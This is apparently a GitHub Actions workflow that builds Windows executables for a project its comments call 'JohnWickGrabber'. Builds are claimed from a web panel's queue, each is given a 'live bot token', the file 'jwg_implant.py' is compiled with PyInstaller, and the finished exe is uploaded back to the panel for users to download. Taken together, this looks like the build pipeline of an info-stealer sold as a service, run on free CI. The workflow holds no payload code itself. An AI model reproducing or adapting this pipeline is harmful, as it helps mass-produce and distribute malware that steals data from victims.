# Builds a JohnWick exe on GitHub's FREE hosted Windows runner -- no machine of
# yours, no cloud account. Public repo => unlimited free minutes.
#
# Two ways it fires:
#   1. Auto: the web panel calls /api/build which (if you set the secrets below)
#      POSTs a workflow_dispatch for that build id. Zero clicks for the user.
#   2. Manual: Actions tab -> "Build exe" -> Run workflow -> paste a build id
#      (leave blank to claim whatever is queued).
#
# Required repo Secrets (Settings -> Secrets and variables -> Actions):
#   JWG_API        https://<your-worker>.workers.dev
#   JWG_ADMIN_USER admin
#   JWG_ADMIN_PASS <the worker admin password>
# The admin role is what lets ci_build.py claim a job and read its live bot token.

name: Build exe

on:
  workflow_dispatch:
    inputs:
      build_id:
        description: "Specific build id to compile (blank = claim next queued)"
        required: false
        default: ""

# Only one build at a time so two runners don't grab the same queue head.
concurrency:
  group: jwg-build
  cancel-in-progress: false

permissions:
  contents: read

jobs:
  build-windows:
    runs-on: windows-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.11"   # matches the pywin32/pyinstaller wheel matrix

      - name: Install build deps
        run: |
          python -m pip install --upgrade pip
          pip install requests requests-toolbelt psutil pycryptodomex pywin32 pyinstaller

      - name: Compile + upload to panel API
        env:
          API: ${{ secrets.JWG_API }}
          ADMIN_USER: ${{ secrets.JWG_ADMIN_USER }}
          ADMIN_PASS: ${{ secrets.JWG_ADMIN_PASS }}
          BID: ${{ github.event.inputs.build_id }}
        shell: bash
        run: |
          # repo root IS the JohnWickGrabber folder (pushed as repo top level),
          # so ci_build.py and jwg_implant.py sit right here -- no subdir to cd into.
          if [ -n "$BID" ] && ! printf '%s' "$BID" | grep -Eq '^[0-9a-f]{8,32}$'; then
            echo "invalid build_id format, refusing"; exit 1
          fi
          python ci_build.py --api "$API" --user "$ADMIN_USER" --pass "$ADMIN_PASS" \
            --repo-root . ${BID:+--build-id "$BID"}

      # Keep the exe in the Actions artifact store too, as a backup even if the
      # upload-back step hiccuped. Users normally download via the site though.
      - name: Archive artifact (backup)
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: built-exe
          path: dist/*.exe
          if-no-files-found: ignore
          retention-days: 7
